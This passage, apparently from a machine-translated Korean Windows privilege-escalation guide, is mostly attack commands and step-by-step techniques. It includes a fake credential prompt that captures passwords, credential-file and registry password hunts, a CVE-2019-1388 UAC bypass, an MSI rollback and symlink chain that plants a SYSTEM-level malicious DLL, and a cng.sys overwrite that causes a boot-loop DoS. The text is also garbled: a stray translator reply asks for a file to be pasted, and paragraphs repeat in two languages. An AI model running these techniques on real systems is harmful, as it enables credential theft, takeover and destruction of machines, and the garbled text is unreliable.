그들이 알고 있을 것 같다고 판단되면 언제든지 **사용자에게 자신의 credentials 또는 심지어 다른 사용자의 credentials를 입력하도록 요청할 수 있습니다**(주의: 클라이언트에게 **직접 요청(asking)**하여 **credentials**를 요구하는 것은 정말 **위험합니다**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **credentials를 포함할 수 있는 가능한 파일명**

과거에 **passwords**가 **clear-text** 또는 **Base64**로 포함되어 있던 것으로 알려진 파일들
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
해당 파일의 내용을 번역하려면 src/windows-hardening/windows-local-privilege-escalation/README.md 파일 전체 텍스트를 붙여 넣어 주세요. 파일을 제공해 주시면 지정한 규칙(코드·태그·링크 미번역 등)에 따라 한국어로 번역해 드리겠습니다.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin의 Credentials

또한 Bin을 확인하여 그 안에 있는 credentials를 찾아보세요.

여러 프로그램에 저장된 **passwords**를 복구하려면 다음을 사용할 수 있습니다: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### registry 내부

**credentials가 포함될 수 있는 다른 registry 키들**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### 브라우저 기록

Chrome 또는 Firefox의 비밀번호가 저장된 db를 확인해야 합니다.\
또한 브라우저의 기록, 북마크 및 즐겨찾기도 확인하세요. 거기에 **비밀번호가** 저장되어 있을 수 있습니다.

브라우저에서 비밀번호를 추출하는 도구:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**은 Windows 운영체제에 내장된 기술로 서로 다른 언어로 작성된 소프트웨어 구성요소들 간의 **상호 통신**을 가능하게 합니다. 각 COM 구성요소는 **class ID (CLSID)**로 식별되며, 각 구성요소는 하나 이상의 인터페이스를 통해 기능을 노출하고, 이 인터페이스들은 **interface IDs (IIDs)**로 식별됩니다.

COM 클래스와 인터페이스는 레지스트리의 **HKEY\CLASSES\ROOT\CLSID** 및 **HKEY\CLASSES\ROOT\Interface**에 각각 정의되어 있습니다. 이 레지스트리는 **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes**를 병합하여 생성되며 결과는 **HKEY\CLASSES\ROOT**입니다.

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

기본적으로, 실행될 DLL들 중 어떤 것을든 **overwrite any of the DLLs**할 수 있다면, 그 DLL이 다른 사용자에 의해 실행될 경우 **escalate privileges**할 수 있습니다.

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **파일 및 레지스트리에서의 일반적인 비밀번호 검색**

**파일 내용 검색**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**특정 파일명을 가진 파일 검색**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**레지스트리에서 키 이름과 비밀번호 검색**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### 비밀번호를 검색하는 도구

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** 플러그인입니다. 이 플러그인은 피해자 시스템 내부에서 **automatically execute every metasploit POST module that searches for credentials**하도록 만들어졌습니다.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)는 이 페이지에 언급된 비밀번호를 포함하는 모든 파일을 자동으로 검색합니다.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne)은 시스템에서 비밀번호를 추출하는 또 다른 훌륭한 도구입니다.

도구 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher)는 이 데이터를 평문으로 저장하는 여러 도구의 **sessions**, **usernames** 및 **passwords**를 검색합니다 (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **SYSTEM으로 실행되는 프로세스가 새 프로세스를 연다고 가정해보자** (`OpenProcess()`) with **full access**. The same process **또한 새 프로세스를 생성한다** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
그런 다음, 만약 당신이 **low privileged process에 대해 full access를 가지고 있다면**, `OpenProcess()`로 생성된 **privileged process에 대한 open handle**을 획득하고 **shellcode를 주입할 수 있다**.\
[이 취약점을 어떻게 탐지하고 악용하는지에 대한 자세한 정보는 이 예제를 읽어보라.](leaked-handle-exploitation.md)\
[다른 글에서는 서로 다른 권한 레벨로 상속된 프로세스와 스레드의 더 많은 open handlers(단지 full access뿐만 아니라)를 테스트하고 악용하는 방법에 대해 더 완전한 설명을 제공한다.](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

공유 메모리 세그먼트, 일명 **pipes**, 는 프로세스 간 통신과 데이터 전송을 가능하게 한다.

Windows는 **Named Pipes**라는 기능을 제공하여 관련 없는 프로세스들도 심지어 다른 네트워크 상에서 데이터를 공유할 수 있게 한다. 이는 클라이언트/서버 아키텍처와 유사하며, 역할은 **named pipe server**와 **named pipe client**로 정의된다.

파이프를 통해 데이터를 보내는 **client**에 대해, 해당 파이프를 설정한 **server**는 필요한 **SeImpersonate** 권한이 있다면 **client의 신원을 가장할 수 있다**. 당신이 흉내낼 수 있는 파이프를 통해 통신하는 **privileged process**를 식별하면, 그 프로세스가 당신이 만든 파이프와 상호작용할 때 그 프로세스의 신원을 채용하여 **더 높은 권한을 얻을 수 있는 기회**가 생긴다. 이러한 공격을 수행하는 방법에 대한 안내는 [**여기**](named-pipe-client-impersonation.md)와 [**여기**](#from-high-integrity-to-system)에서 찾을 수 있다.

또한 다음 도구는 burp 같은 도구로 named pipe 통신을 **intercept**할 수 있게 해준다: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **그리고 이 도구는 privescs를 찾기 위해 모든 파이프를 나열하고 볼 수 있게 한다** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

서버 모드의 Telephony service (TapiSrv)는 `\\pipe\\tapsrv` (MS-TRP)를 노출한다. 원격 인증된 클라이언트는 mailslot-based async event 경로를 악용해 `ClientAttach`를 `NETWORK SERVICE`가 쓰기 가능한 기존 파일에 대한 임의의 **4-byte write**로 전환한 다음, Telephony admin 권한을 얻고 서비스로 임의의 DLL을 로드할 수 있다. 전체 흐름:

- `ClientAttach`에 `pszDomainUser`를 쓰기 가능한 기존 경로로 설정 → 서비스는 이를 `CreateFileW(..., OPEN_EXISTING)`로 열고 async event 쓰기에 사용한다.
- 각 이벤트는 `Initialize`의 공격자가 제어하는 `InitContext`를 해당 핸들에 쓴다. `LRegisterRequestRecipient` (`Req_Func 61`)로 라인 앱을 등록하고, `TRequestMakeCall` (`Req_Func 121`)을 트리거한 다음 `GetAsyncEvents` (`Req_Func 0`)로 가져오고, unregister/shutdown하여 결정론적으로 쓰기를 반복한다.
- `C:\Windows\TAPI\tsec.ini`의 `[TapiAdministrators]`에 자신을 추가하고 재연결한 뒤, 임의의 DLL 경로로 `GetUIDllName`을 호출하여 `NETWORK SERVICE`로서 `TSPI_providerUIIdentify`를 실행한다.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## 기타

### Windows에서 실행을 유발할 수 있는 파일 확장자

다음 페이지를 확인해보라: **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

클릭 가능한 Markdown 링크가 `ShellExecuteExW`로 전달되면 위험한 URI 핸들러(`file:`, `ms-appinstaller:` 또는 등록된 스킴)를 트리거하여 현재 사용자로서 공격자가 제어하는 파일을 실행할 수 있다. 자세한 내용은:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **명령줄에서 비밀번호 모니터링하기**

사용자 권한으로 셸을 얻었을 때, 예약된 작업이나 다른 프로세스들이 **명령줄에 자격증명을 전달하는** 경우가 있을 수 있다. 아래 스크립트는 프로세스의 명령줄을 2초마다 캡처하고 현재 상태를 이전 상태와 비교하여 차이점을 출력한다.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## 프로세스에서 비밀번호 탈취

## 권한이 낮은 사용자에서 NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC 우회

그래픽 인터페이스에 접근할 수 있고 (console 또는 RDP를 통해) UAC가 활성화되어 있다면, 일부 Microsoft Windows 버전에서는 권한 없는 사용자로부터 "NT\AUTHORITY SYSTEM"과 같은 terminal이나 다른 프로세스를 실행하는 것이 가능합니다.

이로 인해 동일한 취약점으로 권한 상승과 UAC 우회가 동시에 가능합니다. 또한 어떤 것도 설치할 필요가 없고, 과정에서 사용되는 binary는 Microsoft에서 서명하고 발급한 것입니다.

영향을 받는 시스템 일부는 다음과 같습니다:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
이 취약점을 악용하려면 다음 단계를 수행해야 합니다:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## Administrator Medium에서 High 무결성 수준으로 / UAC 우회

Integrity Levels에 대해 배우려면 다음을 읽으세요:


{{#ref}}
integrity-levels.md
{{#endref}}

그다음 UAC 및 UAC 우회에 대해 배우려면 다음을 읽으세요:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## 임의 폴더 삭제/이동/이름 변경에서 SYSTEM EoP로

기술은 [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)에 설명되어 있으며 exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)가 제공됩니다.

공격은 기본적으로 Windows Installer의 rollback 기능을 악용하여 정당한 파일을 제거(교체)하고 제거 과정 중에 악성 파일로 바꾸는 방식입니다. 이를 위해 공격자는 `C:\Config.Msi` 폴더를 하이재크하는 데 사용할 **malicious MSI installer**를 만들어야 하며, 이후 다른 MSI 패키지의 제거 과정에서 rollback 파일이 악성 페이로드를 포함하도록 수정된 경우 Windows Installer가 이 폴더에 rollback 파일을 저장하게 됩니다.

요약된 기법은 다음과 같습니다:

1. **Stage 1 – 가로채기 준비 (`C:\Config.Msi`를 비워 두기)**

- Step 1: Install the MSI
- 설치 가능한 폴더(`TARGETDIR`)에 무해한 파일(예: `dummy.txt`)을 설치하는 `.msi`를 만듭니다.
- 인스톨러를 **"UAC Compliant"**로 표시하여 **관리자 권한이 없는 사용자**도 실행할 수 있게 합니다.
- 설치 후 파일에 대한 **handle**을 열린 상태로 유지합니다.

- Step 2: Begin Uninstall
- 동일한 `.msi`를 제거(uninstall)합니다.
- 제거 과정에서 파일들이 `C:\Config.Msi`로 이동되고 `.rbf` 파일로 이름이 변경됩니다(rollback 백업).
- 파일이 `C:\Config.Msi\<random>.rbf`가 될 때를 감지하기 위해 `GetFinalPathNameByHandle`로 열린 파일 핸들을 폴링합니다.

- Step 3: Custom Syncing
- `.msi`는 다음과 같은 **custom uninstall action(`SyncOnRbfWritten`)**을 포함합니다:
- `.rbf`가 작성되었음을 신호(signal)합니다.
- 그런 다음 제거를 계속하기 전에 다른 이벤트를 기다립니다.

- Step 4: Block Deletion of `.rbf`
- 신호를 받으면 `FILE_SHARE_DELETE` 없이 `.rbf` 파일을 열어 **삭제를 차단**합니다.
- 그런 다음 제거가 완료될 수 있도록 다시 신호를 보냅니다.
- Windows Installer가 `.rbf`를 삭제하지 못하여 폴더의 모든 내용을 삭제하지 못하면 **`C:\Config.Msi`는 제거되지 않습니다**.

- Step 5: Manually Delete `.rbf`
- 공격자는 `.rbf` 파일을 수동으로 삭제합니다.
- 이제 **`C:\Config.Msi`는 비어 있으며**, 하이재크할 준비가 되었습니다.

> 이 시점에서, `C:\Config.Msi`를 삭제하기 위해 **SYSTEM 권한의 임의 폴더 삭제 취약점**을 트리거하세요.

2. **Stage 2 – Rollback 스크립트를 악성 스크립트로 교체**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- 직접 `C:\Config.Msi` 폴더를 다시 만듭니다.
- **약한 DACL**(예: Everyone:F)을 설정하고 `WRITE_DAC` 권한으로 열린 **handle**을 유지합니다.

- Step 7: Run Another Install
- 다음과 같은 옵션으로 `.msi`를 다시 설치합니다:
- `TARGETDIR`: 쓰기 가능한 위치.
- `ERROROUT`: 강제 실패를 유발하는 변수.
- 이 설치는 다시 **rollback**을 트리거하는 데 사용되며, rollback은 `.rbs`와 `.rbf`를 읽습니다.

- Step 8: Monitor for `.rbs`
- `ReadDirectoryChangesW`를 사용해 `C:\Config.Msi`를 모니터링하여 새 `.rbs`가 나타날 때까지 기다립니다.
- 파일 이름을 캡처합니다.

- Step 9: Sync Before Rollback
- `.msi`에는 다음과 같은 **custom install action(`SyncBeforeRollback`)**이 포함되어 있습니다:
- `.rbs`가 생성되면 이벤트를 신호합니다.
- 그런 다음 계속하기 전에 대기합니다.

- Step 10: Reapply Weak ACL
- `.rbs 생성` 이벤트를 받은 후:
- Windows Installer는 `C:\Config.Msi`에 강한 ACL을 다시 적용합니다.
- 그러나 당신은 여전히 `WRITE_DAC` 권한이 있는 핸들을 가지고 있으므로 **약한 ACL을 다시 적용**할 수 있습니다.

> ACL은 **핸들 열릴 때만 적용**되므로 여전히 폴더에 쓸 수 있습니다.

- Step 11: Drop Fake `.rbs` and `.rbf`
- `.rbs` 파일을 덮어써서 Windows에게 다음을 지시하는 **가짜 rollback 스크립트**를 넣습니다:
- 당신의 `.rbf` 파일(악성 DLL)을 **권한이 높은 위치**(예: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`)로 복원하라고 지시합니다.
- 악성 SYSTEM 수준 페이로드 DLL을 포함하는 가짜 `.rbf`를 배치합니다.

- Step 12: Trigger the Rollback
- 동기화 이벤트를 신호하여 인스톨러가 재개되도록 합니다.
- 알려진 지점에서 인스톨을 **의도적으로 실패**시키도록 구성된 **type 19 custom action(`ErrorOut`)**이 있습니다.
- 이로 인해 **rollback이 시작**됩니다.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer는:
- 당신의 악성 `.rbs`를 읽고,
- 대상 위치에 당신의 `.rbf` DLL을 복사합니다.
- 이제 **SYSTEM이 로드하는 경로에 악성 DLL이 설치**됩니다.

- Final Step: Execute SYSTEM Code
- 악성 DLL을 로드하는 신뢰할 수 있는 **auto-elevated binary**(예: `osk.exe`)를 실행합니다.
- 짜잔: 당신의 코드가 **SYSTEM 권한으로 실행됩니다**.

### 임의 파일 삭제/이동/이름 변경에서 SYSTEM EoP로

주요 MSI rollback 기법(앞서 설명한 방법)은 전체 폴더(예: `C:\Config.Msi`)를 삭제할 수 있다고 가정합니다. 하지만 취약점이 **임의 파일 삭제**만 허용한다면 어떻게 할까요?

NTFS 내부 동작을 악용할 수 있습니다: 모든 폴더에는 다음과 같은 숨겨진 대체 데이터 스트림이 있습니다:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
이 스트림은 폴더의 **인덱스 메타데이터**를 저장합니다.

따라서 폴더의 **`::$INDEX_ALLOCATION` 스트림을 삭제하면** NTFS는 파일 시스템에서 **해당 폴더 전체를 제거합니다**.

이 작업은 다음과 같은 표준 파일 삭제 API를 사용하여 수행할 수 있습니다:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *파일* 삭제 API를 호출하더라도, **폴더 자체를 삭제합니다**.

### 폴더 내용 삭제에서 SYSTEM EoP로
What if your primitive doesn’t allow you to delete arbitrary files/folders, but it **does allow deletion of the *contents* of an attacker-controlled folder**?

1. 1단계: 미끼 폴더와 파일 설정
- 생성: `C:\temp\folder1`
- 그 안에: `C:\temp\folder1\file1.txt`

2. 2단계: `file1.txt`에 **oplock**을 설정
- oplock은 권한 있는 프로세스가 `file1.txt`를 삭제하려고 시도할 때 **실행을 일시 중지**합니다.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Step 3: Trigger SYSTEM process (e.g., `SilentCleanup`)
- 이 프로세스는 폴더(예: `%TEMP%`)를 스캔하고 그 내용물을 삭제하려고 시도합니다.
- `file1.txt`에 도달하면 **oplock triggers**가 작동하여 제어를 당신의 callback에 넘깁니다.

4. Step 4: Inside the oplock callback – redirect the deletion

- Option A: Move `file1.txt` elsewhere
- 이렇게 하면 `folder1`이 비워지며 oplock을 해제하지 않습니다.
- `file1.txt`을 직접 삭제하지 마세요 — 그러면 oplock이 조기에 해제됩니다.

- Option B: Convert `folder1` into a **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- 옵션 C: `\RPC Control`에 **symlink** 생성:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> 이 방법은 폴더 메타데이터를 저장하는 NTFS 내부 스트림을 겨냥합니다 — 이를 삭제하면 폴더가 삭제됩니다.

5. 5단계: oplock 해제
- SYSTEM 프로세스가 계속 진행되며 `file1.txt`을(를) 삭제하려고 시도합니다.
- 하지만 이제 junction + symlink 때문에 실제로 삭제되는 것은:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**결과**: `C:\Config.Msi`가 SYSTEM에 의해 삭제됩니다.

### From Arbitrary Folder Create에서 Permanent DoS까지

해당 primitive를 악용하면 **SYSTEM/admin 권한으로 임의의 폴더를 생성**할 수 있습니다 — **파일을 쓸 수 없더라도** 또는 **약한 권한을 설정할 수 없더라도**.

이름을 **중요한 Windows 드라이버**로 하는 **폴더**(파일이 아님)를 생성하세요. 예:
```
C:\Windows\System32\cng.sys
```
- 이 경로는 일반적으로 `cng.sys` 커널 모드 드라이버에 해당합니다.
- 만약 해당 경로를 **폴더로 미리 생성해두면**, Windows는 부팅 시 실제 드라이버를 로드하지 못합니다.
- 이후, Windows는 부팅 중 `cng.sys`를 로드하려 시도합니다.
- 폴더를 발견하면, **실제 드라이버를 찾지 못해**, **크래시되거나 부팅이 중단**됩니다.
- **대체 방법이 없으며**, 외부 개입(예: 부팅 수리나 디스크 접근) 없이는 **복구가 불가능**합니다.

### 권한 있는 로그/백업 경로 + OM symlinks를 이용한 임의 파일 덮어쓰기 / 부팅 DoS

권한 있는 서비스(**privileged service**)가 쓰기 가능한 구성(**writable config**)에서 읽어온 경로에 로그/내보내기를 쓸 때, 해당 경로를 **Object Manager symlinks + NTFS mount points**로 리디렉션하여 권한 있는 쓰기를 임의 덮어쓰기로 전환할 수 있습니다(심지어 **SeCreateSymbolicLinkPrivilege** 없이도).

**요구 사항**
- 대상 경로를 저장하는 구성 파일이 공격자에 의해 쓰기 가능한 상태여야 합니다(예: `%ProgramData%\...\.ini`).
- `\RPC Control`에 마운트 포인트를 생성할 수 있고 OM 파일 심볼릭 링크를 만들 수 있어야 합니다 (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- 해당 경로에 쓰는 권한 있는 작업(로그, export, report)이 필요합니다.

**예시 체인**
1. 구성 파일을 읽어 권한 있는 로그 대상 경로를 확인합니다. 예: `C:\ProgramData\ICONICS\IcoSetup64.ini` 안의 `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`.
2. 관리자 권한 없이 해당 경로를 리디렉션합니다:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 권한 있는 컴포넌트가 로그를 쓰기를 기다립니다(예: admin이 "send test SMS"를 트리거). 이제 쓰기는 `C:\Windows\System32\cng.sys`에 기록됩니다.
4. 덮어써진 대상(hex/PE parser)을 검사해 손상 여부를 확인합니다; 재부팅하면 Windows가 변조된 드라이버 경로를 로드하도록 강제되어 → **boot loop DoS**가 발생합니다. 이 방법은 권한 있는 서비스가 쓰기를 위해 열어두는 모든 보호된 파일에도 적용됩니다.

> `cng.sys`는 보통 `C:\Windows\System32\drivers\cng.sys`에서 로드되지만, `C:\Windows\System32\cng.sys`에 복사본이 존재하면 먼저 시도될 수 있어 손상된 데이터에 대한 신뢰할 수 있는 DoS sink가 됩니다.



## **High Integrity에서 System으로**

### **New service**

이미 High Integrity 프로세스에서 실행 중이라면, **path to SYSTEM**은 단순히 **creating and executing a new service**만으로 쉽게 달성할 수 있습니다:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> 서비스 바이너리를 만들 때 유효한 서비스인지, 또는 유효한 서비스가 아닐 경우 20초 내에 종료되므로 필요한 작업을 빠르게 수행하도록 바이너리가 설계되었는지 확인하세요.

### AlwaysInstallElevated

From a High Integrity process you could try to **AlwaysInstallElevated 레지스트리 항목을 활성화**하고 _**.msi**_ 래퍼를 사용해 reverse shell을 **설치**해 볼 수 있습니다.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**할 수 있습니다** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

If you have those token privileges (probably you will find this in an already High Integrity process), you will be able to **open almost any process** (not protected processes) with the SeDebug privilege, **copy the token** of the process, and create an **arbitrary process with that token**.\
만약 이러한 token 권한을 가지고 있다면(아마 이미 High Integrity 프로세스에서 이 권한을 찾게 될 것입니다), SeDebug 권한으로 거의 모든(보호된 프로세스 제외) 프로세스를 **열 수 있으며**, 프로세스의 token을 **복사**하고 그 token으로 **임의의 프로세스를 생성**할 수 있습니다.\
Using this technique is usually **selected any process running as SYSTEM with all the token privileges** (_yes, you can find SYSTEM processes without all the token privileges_).\
이 기술을 사용할 때는 보통 token 권한이 모두 있는 SYSTEM으로 실행되는 프로세스를 선택합니다 (_네, 모든 token 권한이 없는 SYSTEM 프로세스를 찾을 수도 있습니다_).\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

This technique is used by meterpreter to escalate in `getsystem`. The technique consists on **creating a pipe and then create/abuse a service to write on that pipe**. Then, the **server** that created the pipe using the **`SeImpersonate`** privilege will be able to **impersonate the token** of the pipe client (the service) obtaining SYSTEM privileges.\
이 기술은 meterpreter가 `getsystem`에서 권한 상승할 때 사용됩니다. 기술은 **파이프를 생성한 다음 해당 파이프에 쓰도록 서비스(service)를 생성/악용하는 것**으로 구성됩니다. 그런 다음 파이프를 생성한 **서버(server)**는 **`SeImpersonate`** 권한을 사용해 파이프 클라이언트(서비스)의 token을 **가장(impersonate)** 하여 SYSTEM 권한을 획득할 수 있습니다.\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

If you manages to **hijack a dll** being **loaded** by a **process** running as **SYSTEM** you will be able to execute arbitrary code with those permissions. Therefore Dll Hijacking is also useful to this kind of privilege escalation, and, moreover, if far **more easy to achieve from a high integrity process** as it will have **write permissions** on the folders used to load dlls.\
만약 SYSTEM으로 실행되는 **프로세스가 로드하는 dll을 hijack**할 수 있다면, 그 권한으로 임의의 코드를 실행할 수 있습니다. 따라서 Dll Hijacking은 이러한 권한 상승에 유용하며, 특히 high integrity process는 DLL을 로드하는 폴더에 대한 **쓰기 권한**을 가지므로 달성하기가 훨씬 **더 쉽습니다**.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**읽기:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## 추가 자료

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## 유용한 도구

**Windows 로컬 권한 상승 벡터를 찾기 위한 최고의 도구:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
